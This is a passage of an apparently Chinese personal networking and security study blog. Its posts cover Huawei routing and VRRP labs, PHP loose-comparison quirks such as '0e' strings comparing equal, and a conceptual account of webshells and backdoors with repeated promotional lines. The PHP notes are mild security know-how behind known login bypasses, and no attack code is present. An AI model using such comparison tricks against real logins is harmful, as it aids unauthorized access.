+<p>黑洞路由是一种颇有用处的路由，在图中，R1的GE0&#x2F;0&#x2F;0连接着一个终端网络，处于该终端网络的PC将默认网关设置为R1的GE0&#x2F;0&#x2F;0接口IP地址，而为了让PC能够访问R2右侧的服务器网络，我们在R1上配置了一条默认路由：</p>
+<p><img src="/assets/v2-7b54602eb6135a4010b437210ddcf8d6_720w.webp" alt="img"></p>
+<p>当PC机访问本地网段192.168.1.0&#x2F;24之外的资源（包括服务器网络中所有的网段）时，流量都会先被发往R1，然后由R1转发给R2.现在网络中出现这样一个需求：在服务器网络中，有一个特殊的网段——192.168.200.0&#x2F;24并不希望被PC访问，能否仅仅通过路由的配置来实现这个需求呢？</p>
+<p>使用黑洞路由便可，R1增加如下配置</p>
+<p>ip route-static 192.168.200.0 255.255.255.0 NULL0</p>
+<p>使用上述命令就可以为R1增加一条到达192.168.200.0&#x2F;24的路由，而且该路由的出接口是NULL0，完成上述配置后，先查看一下R1的路由表。</p>
+<p>查看的命令是：display ip routing-table。</p>
+<p><img src="/assets/v2-f7fc62ac3fe02c1425199f7d9f385e74_720w.webp" alt="img"></p>
+<p>从路由表中，大家可以看见我们为R1所配置的黑洞路由。现在，当PC访问192.168.200.0&#x2F;24时，数据包先被默认网关R1，R1通过路由表查询，发现数据包的目的IP地址匹配路由192.168.200.0&#x2F;24，而这条路由的出接口是NULL 0，因此它将数据包直接丢弃。如此一来，PC将无法访问192.168.200.0&#x2F;24。实际上，这是一种实现流量过滤的简单而且又有效的方法。</p>
+<p>黑洞路由的应用场景</p>
+<p>（1）在部署了路由汇总的网络中，用于防止数据转发出现环路</p>
+<p>（2）在部署了NAT（网络地址转换）的网络中，用于防止数据转发出现的环路</p>
+<p>（3）在BGP网络中，用于发布特定网段的路由</p>
+<p>定义：<br>一条路由无论是静态还是动态，都需要关联到一个出接口，在众多的出接口中，有一种接口非常特殊，即Null（无效）接口，这种类型的接口只有一个编号0，类似（交换机、路由器）的出接口Interface g或e 0&#x2F;0&#x2F;0; Null0是系统保留的逻辑接口，当转发网络设备在转发某些数据包时，如果使用出接口为Null0的路由，那么这些报文会被直接丢弃，就像直接丢进一个黑洞里，因此出接口为Null0的路由被称为黑洞路由。</p>
+<p>作用：<br>1.拒绝访问<br><img src="https://img-blog.csdnimg.cn/20201116235415638.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzQ5NTI2Mg==,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>  2.防止出现环路，（如黑客攻击）<br><img src="https://img-blog.csdnimg.cn/20201117002824922.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzQ5NTI2Mg==,size_16,color_FFFFFF,t_70#pic_center"></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-单臂路由"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/%E5%8D%95%E8%87%82%E8%B7%AF%E7%94%B1/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.195Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>第一步，交换机创建3个vlan<br>[Huawei]vlan bat 10 20 30<br>分别来到3个接口，配置vlan<br>[Huawei]int e0&#x2F;0&#x2F;1<br>[Huawei-Ethernet0&#x2F;0&#x2F;1]port link-type access<br>[Huawei-Ethernet0&#x2F;0&#x2F;1]port default vlan 10</p>
+<p>三层交换机，对外面的接口得是trunk。access不行，它只有一个vlan<br>[Huawei-Ethernet0&#x2F;0&#x2F;4]port link-type trunk<br>允许这三个不同的vlan<br>[Huawei-Ethernet0&#x2F;0&#x2F;4]port trunk allow-pass vlan 10 20 30</p>
+<p>关于路由器（单臂路由的配置）<br>下行口，多个子接口<br>[Huawei]int g0&#x2F;0&#x2F;0.?<br>  &lt;1-4096&gt;  GigabitEthernet interface subinterface number<br>有4000多个子接口可以用</p>
+<p>pc1的网关，是路由器的第一个子接口<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.1]dot1q termination vid 10<br>这个命令让0.1接口只能接收到vlan 10的流量<br>配ip地址，要充当PC1的网关：<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.1]ip add 192.168.1.1 24<br>开启广播：<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.1]arp broadcast enable </p>
+<p>0.1:192.168.1.1&#x2F;24<br>0.2:192.168.2.1&#x2F;24<br>0.3:192.168.3.1&#x2F;24<br>三个子接口都这样配</p>
+<p>实现PC4的通信：<br>路由器的G0&#x2F;0&#x2F;1接口配置上PC4的网关<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]ip add 61.139.2.1 30</p>
+<p>注意所有的PC都要配置网关<br>网关是什么呢？<br>PC直连的对端路由器这个接口的ip地址</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-web的B站学习"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/web%E7%9A%84B%E7%AB%99%E5%AD%A6%E4%B9%A0/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.193Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="弱类型问题："><a href="#弱类型问题：" class="headerlink" title="弱类型问题："></a>弱类型问题：</h1><p>&#x3D;&#x3D;&#x3D; 在类型比较的时候，会先判断两种字符串的类型是否相等，再比较</p>
+<p>&#x3D;&#x3D; 在进行比较的时候，会先将字符串类型转换为相同，再比较</p>
+<p>（如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则会被转换成数值并且按照数值来进行比较） </p>
+<?php
+
+Var_dump(“admin”==0);  //true
+
+Var_dump(“1admin”==1); //true
+
+Var_dump(“admin1”==1); //false
+
+Var_dump(“admin1”==0); //true
+
+Var_dump(“0e123456”==”0e234512”); //true
+
+?>
+
+<p>1.admin是字符串转换为数字转为0</p>
+<p>从第一个字符开始，是数字则保留，不是则后面的不作数</p>
+<p>Eg. admin-&gt;0  1admin-&gt;1  1admin1232-&gt;1</p>
+<p>2.“0e123456”这种不是字符串，它是科学计数法，e代表10的几次方，所以它是数字</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-webshell是什么"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/webshell%E6%98%AF%E4%BB%80%E4%B9%88/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.190Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="一、webshell是什么？"><a href="#一、webshell是什么？" class="headerlink" title="一、webshell是什么？"></a>一、webshell是什么？</h1><p>Webshell是黑客经常使用的一种恶意脚本，其目的是获得服务器的执行操作权限，常见的webshell编写语言为asp、jsp和php。比如执行系统命令、窃取用户数据、删除web页面、修改主页等，其危害不言而喻。黑客通常利用常见的漏洞，如SQL注入、远程文件包含(RFI)、FTP，甚至使用跨站点脚本攻击(XSS)等方式作为社会工程攻击的一部分，最终达到控制网站服务器的目的。<br>网络安全重磅福利：入门&amp;进阶全套282G学习资源包免费分享！</p>
+<p>简单的说来，webshell就是一个asp或php木马后门，黑客在入侵了一个网站后，常常在将这些 asp或php木马后门文件放置在网站服务器的web目录中，与正常的网页文件混在一起。<br>网络安全重磅福利：入门&amp;进阶全套282G学习资源包免费分享！</p>
+<p>然后黑客就可以用web的方式，通过asp或php木马后门控制网站服务器，包括上传下载文件、查看数据库、执行任意程序命令等。</p>
+<p>下面为了更好理解webshell我们来了解两个概念：</p>
+<h1 id="二、什么是“木马”？"><a href="#二、什么是“木马”？" class="headerlink" title="二、什么是“木马”？"></a>二、什么是“木马”？</h1><p>网络安全重磅福利：入门&amp;进阶全套282G学习资源包免费分享！</p>
+<p>“木马”全称是“特洛伊木马(TrojanHorse)”，原指古希腊士兵藏在木马内进入敌方城市从而占领敌方城市的故事。在Internet上，“特洛伊木马”指一些程序设计人员在其可从网络上下载 (Download)的应用程序或游戏中，包含了可以控制用户的计算机系统的程序，可能造成用户的系统被破坏甚至瘫痪。</p>
+<h1 id="三、什么是后门？"><a href="#三、什么是后门？" class="headerlink" title="三、什么是后门？"></a>三、什么是后门？</h1><p>一台计算机上有65535个端口，那么如果把计算机看作是一间屋子，那么这65535个端口就可以它看做是计算机为了与外界连接所开的65535 扇门。每个门的背后都是一个服务。有的门是主人特地打开迎接客人的（提供服务），有的门是主人为了出去访问客人而开设的（访问远程服务）——理论上，剩下的其他门都该是关闭着的，但偏偏由于各种原因，很多门都是开启的。</p>
+<p>于是就有好事者进入，主人的隐私被刺探，生活被打扰，甚至屋里的东西也被搞得一片狼迹。这扇悄然被开启的门——就是“后门”。</p>
+<h1 id="四、webshell的特点"><a href="#四、webshell的特点" class="headerlink" title="四、webshell的特点"></a>四、webshell的特点</h1><p>webshell最大的特点就是可以穿越防火墙，由于与被控制的服务器或远程主机交换的数据都是通过80端口传递的，因此不会被防火墙拦截。并且使用webshell一般不会在系统日志中留下记录，只会在网站的web日志中留下一些数据提交记录，没有经验的管理员是很难看出入侵痕迹的。</p>
+<h1 id="五、webshell攻击危害"><a href="#五、webshell攻击危害" class="headerlink" title="五、webshell攻击危害"></a>五、webshell攻击危害</h1><p>webshell是网站入侵的脚本攻击工具，黑客通过入侵网站上传webshell后获得服务器的执行操作权限，比如执行系统命令、窃取用户数据、删除web页面、修改主页等。</p>
+<p>简单来说，webshell就是一种可以在web服务器上执行的后台脚本或者命令执行环境<br>或者说，webshell是网站入侵的脚本攻击工具</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-VRRP配置"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/VRRP%E9%85%8D%E7%BD%AE/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.188Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>首先配置ISP<br>[Huawei]int g 0&#x2F;0&#x2F;2<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;2]ip add 61.139.2.1 24<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;2]int g0&#x2F;0&#x2F;0<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0]ip add 10.1.1.1 24<br>0接口的网段是10.1.1.0&#x2F;24，我们这里ip配置为10.1.1.1<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0]int g0&#x2F;0&#x2F;1<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]ip add 20.1.1.1 24<br>1接口的网段是20.1.1.0&#x2F;24，我们这里ip配置为20.1.1.1</p>
+<p>AR1配置<br>[Huawei]int g0&#x2F;0&#x2F;1<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]ip add 10.1.1.2 24<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]int g0&#x2F;0&#x2F;0<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0]ip add 192.168.1.10 24<br>AR2配置<br>[Huawei]int g0&#x2F;0&#x2F;0<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0]ip add 20.1.1.2 24<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0]int g0&#x2F;0&#x2F;1<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]ip add 192.168.1.20 24</p>
+<p>首先实现内外网的通信，让PC1能够通过AR1访问到外网<br>先以AR1为PC1的路由访问<br>（此时PC1不能访问到外网，AR1没有外网的路由）<br>（所以先给AR1配置默认路由）<br>[Huawei]ip route-static 0.0.0.0 0 10.1.1.1<br>这样PC1把流量发往AR1，通过默认路由，就可以流量发给ISP，ISP是直连路由，就可以发给PC3了<br>注意：PC3流量回来的时候，要把流量交给网关，网关需要把流量交给AR1<br>但是默认情况下，网关是不知道PC1的存在的，<br>所以说网关也要配置一个关于192.168.1.0网段的路由，指向AR1<br>ISP：[Huawei]ip route-static 192.168.1.0 24 10.1.1.2<br>在访问192.168.1.0网段时，把流量交给10.1.1.2路由</p>
+<p>让PC1能够通过AR2访问到外网<br>AR2：[Huawei]ip route-static 0.0.0.0 0 20.1.1.1<br>ISP：  [Huawei]ip route-static 192.168.1.0 24 20.1.1.2</p>
+<p>配置ARRP实现主备模式<br>AR1配置：<br>[Huawei]int g0&#x2F;0&#x2F;0	<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0]vrrp vrid 1 virtual-ip 192.168.1.1<br>192.168.1.1为客户端网关<br>申明优先级<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0]vrrp vrid 1 priority ?<br>  INTEGER&lt;1-254&gt;  The level of priority(default is 100)<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0]vrrp vrid 1 priority 120<br>配置抢占（可有可无）<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0]vrrp vrid 1 preempt-mode timer delay ?<br>  INTEGER&lt;0-3600&gt;  Value of timer, in seconds(default is 0)<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0]vrrp vrid 1 preempt-mode timer delay 10<br>配置链路跟踪<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0]vrrp vrid 1 track int g0&#x2F;0&#x2F;1 reduced 30<br>主配置好了，还有备：<br>AR2：<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]vrrp vrid 1 virtual-ip 192.168.1.1</p>
+<p>可以通过dis vrrp查看</p>
+<p>这样就算是配置完了</p>
+<p>我们可以通过抓包查看AR1的接口<br>我们可以发现，只有请求，没有回来的数据<br>数据没有从AR1回来而是从AR2回来的<br>为什么呢<br>和ISP有关系，当ISP在回应PC1的时候，它其实有两条路由条目<br>查看ISP：[Huawei]dis ip routing-table<br>…<br>192.168.1.0&#x2F;24  Static  60   0          RD   10.1.1.2        GigabitEthernet 0&#x2F;0&#x2F;0<br>                             Static  60   0          RD   20.1.1.2        GigabitEthernet 0&#x2F;0&#x2F;1<br>…<br>优先级一样为60，可以从10.1.1.2或者20.1.1.2回来</p>
+<p>试验：当R1故障后，再走R2<br>down掉AR1上面的接口，ping还是会继续，中间可能会有一小段的中断</p>
+<p>需求2：<br>当实现需求1后，要求流量从左边出去时也从左边回，<br>当左边故障时，流量从右边出去也从右边回</p>
+<p>如果我们前面试验中down掉的是AR1下面的接口，会出现什么问题<br>首先，AR1和AR2没法进行通信，AR2改为master<br>但是再来查看路由表，还是存在通过10.1.1.2下来这条路，<br>这会出现什么情况？<br>（流量有可能会从左边或者右边下来）<br>当从左边下来的时候，这条路是断的，就会出错</p>
+<p>那么为什么，down掉上面的接口，没有这个问题呢？<br>可以实操一遍，shutdown上面这个链路，就意味着这个路由也没有了</p>
+<p>所以我们要实现数据从哪边出去就从哪边回来</p>
+<p>在ISP中设置优先级<br>[Huawei]ip route-static 192.168.1.0 24 10.1.1.2 preference 50<br>查看<br>192.168.1.0&#x2F;24  Static  50   0          RD   10.1.1.2        GigabitEthernet 0&#x2F;0&#x2F;0<br>此时就只存在一条路由条目了<br>之前的：<br>192.168.1.0&#x2F;24  Static  60   0          RD   10.1.1.2        GigabitEthernet 0&#x2F;0&#x2F;0<br>                             Static  60   0          RD   20.1.1.2        GigabitEthernet 0&#x2F;0&#x2F;1<br>但其实这样有问题，当左边下面接口down了，因为优先级高，还是会走左边，但是下不去</p>
+<p>这里我们要用到链路检测技术<br>在ISP实现链路检测<br>ISP实时监控下端口是否存活<br>不存活时，通过链路检测机制，把整个链路切掉</p>
+<p>通过NGA技术：<br>ISP：<br>[Huawei]ip route-static 192.168.1.0 24 g 0&#x2F;0&#x2F;0 10.1.1.2 track nqa admin1 icmp<br>g 0&#x2F;0&#x2F;0  是端口<br>10.1.1.2 是下一跳地址<br>查看路由：dis cu<br>…<br>ip route-static 192.168.1.0 255.255.255.0 10.1.1.2 preference 50<br>ip route-static 192.168.1.0 255.255.255.0 20.1.1.2<br>ip route-static 192.168.1.0 255.255.255.0 GigabitEthernet0&#x2F;0&#x2F;0 10.1.1.2 track nq<br>…<br>第3条是刚刚的<br>第1条是前面配置的，仍然存在</p>
+<p>我们要把左边的优先级调高，但是第1条是没有链路检测的，会影响我们通信，让链路检测那条失效<br>[Huawei]undo ip route-static 192.168.1.0 255.255.255.0 10.1.1.2 preference 50<br>先删掉第1条</p>
+<p>[Huawei]ip route-static 192.168.1.0 255.255.255.0 GigabitEthernet0&#x2F;0&#x2F;0 10.1.1.2<br>preference 50 track nqa damin1 icmp<br>重新配置优先级<br>[Huawei]dis ip routing-table<br>查看：<br>…<br>192.168.1.0&#x2F;24  Static  50   0           D   10.1.1.2        GigabitEthernet 0&#x2F;0&#x2F;0<br>…</p>
+<p>[Huawei]nqa test-instance admin1 icmp<br>[Huawei-nqa-admin1-icmp]test-type icmp	<br>[Huawei-nqa-admin1-icmp]destination-address ipv4 192.168.1.10<br>[Huawei-nqa-admin1-icmp]frequency 10<br>设置频率<br>[Huawei-nqa-admin1-icmp]probe-count 1<br>每次发送探针数量<br>[Huawei-nqa-admin1-icmp]start now<br>启动<br>配置完成</p>
+<p>测试：<br>shutdown AR1的0接口<br>查看ISP：<br>[Huawei]dis ip routing-table<br>…<br>192.168.1.0&#x2F;24  Static  60   0          RD   20.1.1.2        GigabitEthernet 0&#x2F;0&#x2F;1<br>…<br>改成走另一条路了<br>undo回来：<br>192.168.1.0&#x2F;24  Static  50   0           D   10.1.1.2        GigabitEthernet 0&#x2F;0&#x2F;0</p>
+<p>VRRP的负载分担模式：<br>首先实现能够访问<br>ISP配置：<br>[Huawei]int g0&#x2F;0&#x2F;0<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0]ip add 61.139.2.2 24<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0]int g0&#x2F;0&#x2F;1<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]ip add 11.0.0.1 24<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]int g0&#x2F;0&#x2F;2<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;2]ip add 12.0.0.1 24</p>
+<p>配置LSW1：<br>它此时作为路由器，有两个路由，因为它需要接收PC1和PC2的流量<br>对于PC1作为它的主网关<br>对于PC2作为它的备网关<br>[Huawei]vlan 10	<br>[Huawei-vlan10]vlan 20<br>[Huawei-vlan20]int vlan 10	<br>[Huawei-Vlanif10]ip add 192.168.1.10 24<br>[Huawei-Vlanif10]int vlan 20	<br>[Huawei-Vlanif20]ip add 192.168.2.20 24</p>
+<p>然后就是它的上行口和下行口<br>LSW1的2接口要和ISP的1接口通信<br>该给2接口配ip，但是华为不能这样，所以我们创建一个vlan：<br>[Huawei-Vlanif20]vlan 100<br>[Huawei-vlan100]int vlan 100<br>[Huawei-Vlanif100]ip add 11.0.0.2 24<br>[Huawei-Vlanif100]int g0&#x2F;0&#x2F;2<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;2]port link-type access<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;2]port default vlan 100<br>检查通没有<br>[Huawei]ping 11.0.0.1<br>  PING 11.0.0.1: 56  data bytes, press CTRL_C to break<br>    Reply from 11.0.0.1: bytes&#x3D;56 Sequence&#x3D;1 ttl&#x3D;255 time&#x3D;60 ms<br>    Reply from 11.0.0.1: bytes&#x3D;56 Sequence&#x3D;2 ttl&#x3D;255 time&#x3D;50 ms<br>    Reply from 11.0.0.1: bytes&#x3D;56 Sequence&#x3D;3 ttl&#x3D;255 time&#x3D;30 ms<br>    Reply from 11.0.0.1: bytes&#x3D;56 Sequence&#x3D;4 ttl&#x3D;255 time&#x3D;10 ms<br>    Reply from 11.0.0.1: bytes&#x3D;56 Sequence&#x3D;5 ttl&#x3D;255 time&#x3D;50 ms</p>
+<p>  — 11.0.0.1 ping statistics —<br>    5 packet(s) transmitted<br>    5 packet(s) received<br>    0.00% packet loss<br>    round-trip min&#x2F;avg&#x2F;max &#x3D; 10&#x2F;40&#x2F;60 ms<br>[Huawei]<br>这样LSW1就可以和ISP通信了</p>
+<p>然后是LSW1的1接口<br>因为1接口既要承载vlan10的流量，又要承担vlan20<br>所以它是加到trunk中<br>[Huawei]int g0&#x2F;0&#x2F;1<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]port link-type trunk<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]port trunk<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]port trunk allow-pass vlan 10 20</p>
+<p>同样的<br>LSW2：<br>[Huawei]vlan 10<br>[Huawei-vlan10]int vlan 10	<br>[Huawei-Vlanif10]ip address 192.168.1.20 24<br>[Huawei-Vlanif10]vlan 20	<br>[Huawei-vlan20]int vlan 20<br>[Huawei-Vlanif20]ip address 192.168.2.10 24	<br>[Huawei-Vlanif20]q<br>[Huawei]vlan 100<br>[Huawei-vlan100]int g0&#x2F;0&#x2F;2<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;2]port link-type access<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;2]port default vlan 100<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;2]q	<br>[Huawei-Vlanif100]ip add 12.0.0.2 24<br>试验：	<br>[Huawei-Vlanif100]ping 12.0.0.1<br>  PING 12.0.0.1: 56  data bytes, press CTRL_C to break<br>    Reply from 12.0.0.1: bytes&#x3D;56 Sequence&#x3D;1 ttl&#x3D;255 time&#x3D;80 ms<br>    Reply from 12.0.0.1: bytes&#x3D;56 Sequence&#x3D;2 ttl&#x3D;255 time&#x3D;50 ms<br>    Reply from 12.0.0.1: bytes&#x3D;56 Sequence&#x3D;3 ttl&#x3D;255 time&#x3D;50 ms<br>    Reply from 12.0.0.1: bytes&#x3D;56 Sequence&#x3D;4 ttl&#x3D;255 time&#x3D;20 ms<br>    Reply from 12.0.0.1: bytes&#x3D;56 Sequence&#x3D;5 ttl&#x3D;255 time&#x3D;40 ms</p>
+<p>  — 12.0.0.1 ping statistics —<br>    5 packet(s) transmitted<br>    5 packet(s) received<br>    0.00% packet loss<br>    round-trip min&#x2F;avg&#x2F;max &#x3D; 20&#x2F;48&#x2F;80 ms<br>[Huawei-Vlanif100]q<br>[Huawei]</p>
+<p>LSW3：<br>上行口都是trunk，要接收vlan10 和vlan20，是trunk<br>下行口是access<br>[Huawei]vlan 10	<br>[Huawei-vlan10]vlan 20<br>[Huawei-vlan20]q<br>[Huawei]int e0&#x2F;0&#x2F;3<br>[Huawei-Ethernet0&#x2F;0&#x2F;3]port link-type trunk	<br>[Huawei-Ethernet0&#x2F;0&#x2F;3]port trunk allow-pass vlan all	<br>[Huawei-Ethernet0&#x2F;0&#x2F;3]int e0&#x2F;0&#x2F;4<br>[Huawei-Ethernet0&#x2F;0&#x2F;4]port link-type trunk<br>[Huawei-Ethernet0&#x2F;0&#x2F;4]port trunk allow-pass vlan all<br>[Huawei-Ethernet0&#x2F;0&#x2F;4]int e0&#x2F;0&#x2F;1<br>[Huawei-Ethernet0&#x2F;0&#x2F;1]port link-type access<br>[Huawei-Ethernet0&#x2F;0&#x2F;1]port default vlan 10	<br>[Huawei-Ethernet0&#x2F;0&#x2F;1]int e0&#x2F;0&#x2F;2<br>[Huawei-Ethernet0&#x2F;0&#x2F;2]port link-type access<br>[Huawei-Ethernet0&#x2F;0&#x2F;2]port default vlan 20</p>
+<p>先来测试PC1能不能访问到外面PC3<br>设置PC1的网关为：192.168.1.10<br>首先ping外网，LSW1的路由,给LSW1配置：<br>[Huawei]ip route-static 0.0.0.0 0 11.0.0.1<br>出去后，需要写回程路由，ISP：<br>[Huawei]ip route-static 192.168.1.0 24 11.0.0.2</p>
+<p>这个我没实现，出错了，后面再说，不搞了</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-VRRP"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/VRRP/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.187Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="虚拟路由冗余协议-VRRP"><a href="#虚拟路由冗余协议-VRRP" class="headerlink" title="虚拟路由冗余协议(VRRP)"></a><strong>虚拟路由冗余协议(VRRP)</strong></h1><h2 id="VRRP简介："><a href="#VRRP简介：" class="headerlink" title="VRRP简介："></a>VRRP简介：</h2><h3 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h3><p>虚拟路由冗余协议<strong>VRRP</strong>（Virtual Router Redundancy Protocol）通过把几台路由设备联合组成一台虚拟的路由设备，将虚拟路由设备的IP地址作为用户的默认网关实现与外部网络通信。当网关设备发生故障时，VRRP机制能够选举新的网关设备承担数据流量，从而保障网络的可靠通信。</p>
+<h3 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h3><p>VRRP能够在不改变组网的情况下，采用将多台路由设备组成一个虚拟路由器，通过配置虚拟路由器的IP地址为默认网关，实现默认网关的备份。当网关设备发生故障时，VRRP机制能够选举新的网关设备承担数据流量，从而保障网络的可靠通信。</p>
+<h3 id="收益："><a href="#收益：" class="headerlink" title="收益："></a>收益：</h3><p>在具有多播或广播能力的局域网（如以太网）中，借助VRRP能在网关设备出现故障时仍然提供高可靠的缺省链路，无需修改主机及网关设备的配置信息便可有效避免单一链路发生故障后的网络中断问题。</p>
+<h2 id="VRRP原理描述"><a href="#VRRP原理描述" class="headerlink" title="VRRP原理描述"></a>VRRP原理描述</h2><h3 id="VRRP概述："><a href="#VRRP概述：" class="headerlink" title="VRRP概述："></a><strong>VRRP概述：</strong></h3><p>​	•<strong>VRRP路由器</strong>：运行VRRP协议的设备，它可能属于一个或多个虚拟路由器。</p>
+<p>​	•<strong>虚拟路由器</strong>：又称VRRP备份组，由一个Master设备和多个Backup设备组成，被当作一个共享局域网内主机的缺省网关。</p>
+<p>​	•<strong>Master路由器</strong>：承担转发报文任务的VRRP设备。</p>
+<p>​	•<strong>Backup路由器</strong>：一组没有担转发任务的VRRP设备，当Master设备出现故障时，它们将通过竞选成为新的Master设备。</p>
+<p>​	•<strong>VRID</strong>：虚拟路由器的标识。</p>
+<p>​	•<strong>虚拟IP地址</strong>：虚拟路由器的IP地址，一个虚拟路由器可以有一个或多个IP地址，由用户配置。</p>
+<p>​	•<strong>IP地址拥有者</strong>：如果一个VRRP设备将虚拟路由器IP地址作为真实的接口地址，则该设备被称为IP地址拥有者。如果IP地址拥有者是可用的，通常它将成为Master。</p>
+<p>​	•<strong>虚拟MAC地址</strong>：虚拟路由器根据虚拟路由器ID生成的MAC地址。一个虚拟路由器拥有一个虚拟MAC地址，格式为：00-00-5E-00-01-{VRID}(VRRP for IPv4)；00-00-5E-00-02-{VRID}(VRRP for IPv6)。当虚拟路由器回应ARP请求时，使用虚拟MAC地址，而不是接口的真实MAC地址。</p>
+<h3 id="VRRP报文："><a href="#VRRP报文：" class="headerlink" title="VRRP报文："></a>VRRP报文：</h3><p><strong>VRRP协议报文用来将Master设备的优先级和状态通告给同一备份组的所有Backup设备。</strong></p>
+<p>VRRP协议报文封装在IP报文中，发送到分配给VRRP的IP组播地址。在IP报文头中，源地址为发送报文接口的主IP地址（不是虚拟IP地址），目的地址是224.0.0.18，TTL是255，协议号是112。</p>
+<p>VRRP报文的IP头中，TTL必须为255。当VRRP路由器收到TTL不等于255的VRRP协议报文后，必须丢弃。</p>
+<p>主IP地址：从接口的真实IP地址中选出来的一个主用IP地址，通常选择配置的第一个IP地址。</p>
+<p>目前，VRRP协议包括两个版本：VRRPv2和VRRPv3。VRRPv2仅适用于IPv4网络，VRRPv3适用于IPv4和IPv6两种网络。</p>
+<p>基于不同的网络类型，VRRP可以分为VRRP for IPv4和VRRP for IPv6（简称VRRP6）。VRRP for IPv4支持VRRPv2和VRRPv3，而VRRP for IPv6仅支持VRRPv3。</p>
+<h4 id="VRRP报文结构："><a href="#VRRP报文结构：" class="headerlink" title="VRRP报文结构："></a>VRRP报文结构：</h4><p>VRRPv2报文结构</p>
+<p><img src="/assets/70-17167920496906.png"></p>
+<p>VRRPv3报文结构</p>
+<p><img src="/assets/70-17167920916999.png"></p>
+<h4 id="字段解释："><a href="#字段解释：" class="headerlink" title="字段解释："></a>字段解释：</h4><table>
+<thead>
+<tr>
+<th>字段</th>
+<th>长度</th>
+<th>描述</th>
+</tr>
+</thead>
